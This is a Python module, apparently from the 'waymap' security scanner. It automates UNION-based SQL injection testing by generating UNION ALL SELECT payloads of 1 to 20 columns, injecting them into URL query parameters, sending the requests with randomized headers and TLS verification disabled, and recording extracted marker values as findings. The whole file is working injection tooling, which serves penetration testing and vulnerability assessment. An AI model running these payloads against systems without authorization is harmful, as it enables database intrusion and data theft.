# Copyright (c) 2026 waymap developers
# See the file 'LICENSE' for copying permission.

"""Union Query-based SQL Injection Scanner."""

import re
import threading
import requests
from lib.core import http
from datetime import datetime
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Generator, List, Tuple, Optional

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from lib.core.config import get_config
from lib.core.logger import get_logger
from lib.ui import print_status, print_header
from lib.parse.random_headers import generate_random_headers
from lib.core.state import stop_scan
from lib.core.result_manager import ResultManager
from lib.injection.sqlin.common import detect_server_info, parameter_names

config = get_config()
logger = get_logger(__name__)
_found_pairs = set()
_found_lock = threading.Lock()

def build_payloads(delimiters: Tuple[str, str], marker_value: int, max_columns: int = 20) -> List[str]:
    marker_hex = "".join(f"{ord(char):02x}" for char in str(marker_value))
    marker = f"CONCAT(0x716a6b7671,0x{marker_hex},0x7177766b71)"
    payloads = []
    for column_count in range(1, max_columns + 1):
        for marker_index in range(column_count):
            columns = ["NULL"] * column_count
            columns[marker_index] = marker
            payloads.append(f"UNION ALL SELECT {','.join(columns)}")
    return payloads


def inject_union_payload(url: str, payload: str, marker_value: int) -> Generator[Tuple[str, str, str], None, None]:
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    for param, values in query_params.items():
        original = values[0] if values else ""
        if original.lstrip("-").isdigit():
            candidates = [
                f"-{marker_value} {payload}-- -",
                f"{original} {payload}-- -",
            ]
        else:
            candidates = [
                f"{original}' {payload}-- -",
                f'{original}" {payload}-- -',
                f"{original} {payload}-- -",
            ]

        for candidate in candidates:
            test_params = query_params.copy()
            test_params[param] = [candidate]
            parts = list(parsed_url)
            parts[4] = urlencode(test_params, doseq=True)
            yield urlunparse(parts), param, candidate


def make_request(test_url: str, delimiters: Tuple[str, str]) -> Tuple[bool, Optional[str]]:
    """Make request and check for delimiters."""
    try:
        headers = generate_random_headers()
        response = http.get(test_url, headers=headers, verify=False, timeout=config.REQUEST_TIMEOUT)
        
        pattern = re.compile(f"{re.escape(delimiters[0])}(.*?){re.escape(delimiters[1])}")
        match = pattern.search(response.text)
        if match:
            return True, match.group(1).strip()
    except requests.RequestException as e:
        logger.debug(f"Request error: {e}")
    return False, None


def split_select_columns(select_list: str) -> List[str]:
    columns = []
    current = []
    depth = 0
    for char in select_list:
        if char == "(":
            depth += 1
        elif char == ")" and depth:
            depth -= 1
        elif char == "," and depth == 0:
            columns.append("".join(current).strip())
            current = []
            continue
        current.append(char)
    columns.append("".join(current).strip())
    return columns


def union_shape_from_value(injected_value: str) -> Tuple[Optional[int], Optional[int]]:
    try:
        select_list = injected_value.split(" UNION ALL SELECT ", 1)[1].split("--", 1)[0]
    except IndexError:
        return None, None

    columns = split_select_columns(select_list)
    for index, column in enumerate(columns, start=1):
        if "CONCAT(" in column:
            return len(columns), index
    return len(columns), None


def union_based_sqli(url: str, thread_count: int) -> bool:
    """Perform union query-based SQLi test."""
    from lib.injection.sqlin.sql import vulnerable_pairs

    delimiters = ('qjkvq', 'qwvkq')
    marker_value = 7341
    payloads = build_payloads(delimiters, marker_value)
    print_status(f"Testing up to {len(payloads) * 2} UNION requests (1-20 columns)", "info")

    for index, payload in enumerate(payloads, start=1):
        if index > 1 and index % 50 == 0:
            print_status(f"UNION progress: tested {index - 1}/{len(payloads)} payloads", "info")
        for test_url, injected_param, injected_value in inject_union_payload(url, payload, marker_value):
            if stop_scan.is_set(): return False
            pair_key = (url, injected_param)
            with _found_lock:
                if pair_key in _found_pairs:
                    return False
            
            try:
                found, extracted = make_request(test_url, delimiters)
                if found:
                    with _found_lock:
                        if pair_key in _found_pairs:
                            return False
                        _found_pairs.add(pair_key)
                    server, technology = detect_server_info(url)

                    print_status("Vulnerability Found!", "success")
                    print_status(f"  URL: {url}", "info")
                    print_status(f"  Parameter: {injected_param}", "info")
                    print_status(f"  Payload: {injected_param}={injected_value}", "info")
                    print_status(f"  Extracted Value: {extracted}", "info")
                    column_count, injectable_column = union_shape_from_value(injected_value)

                    vuln_data = {
                        "Vulnerable URL": url,
                        "Injected Parameter": injected_param,
                        "Payload": f"{injected_param}={injected_value}",
                        "Payload Title": "Generic UNION query (NULL) - 1 to 20 columns",
                        "DBMS Detected": "MySQL",
                        "Web Technology": technology,
                        "Server Name": server,
                        "Severity": 10,
                        "Timestamp": datetime.now().isoformat(),
                        "Extracted Value": extracted,
                        "Columns": column_count,
                        "Injectable Column": injectable_column
                    }
                    domain = urlparse(url).netloc
                    result_manager = ResultManager(domain)
                    result_manager.add_finding("SQL Injection", "Technique: Union-Query", vuln_data)
                    vulnerable_pairs.add((url, injected_param))
                    return True
            except Exception as e:
                logger.error(f"Error testing {test_url}: {e}")
            
    return False


def process_urls(urls: List[str], thread_count: int) -> None:
    """Process URLs for union-based SQLi."""
    _found_pairs.clear()
    print_header("UNION QUERY SQLI", color="cyan")
    
    for url in urls:
        params = parameter_names(url)
        if params:
            print_status(f"Testing Union Query SQLi: {url} (Params: {', '.join(params)})", "info")

    def check_url(url):
        if stop_scan.is_set(): return False
        return union_based_sqli(url, thread_count)

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = {executor.submit(check_url, url): url for url in urls}
        
        for future in as_completed(futures):
            if stop_scan.is_set():
                break
            try:
                if future.result():
                    pass
            except KeyboardInterrupt:
                from lib.core.interrupt import exit_clean
                exit_clean()
            except Exception as e:
                logger.error(f"Error in worker: {e}")
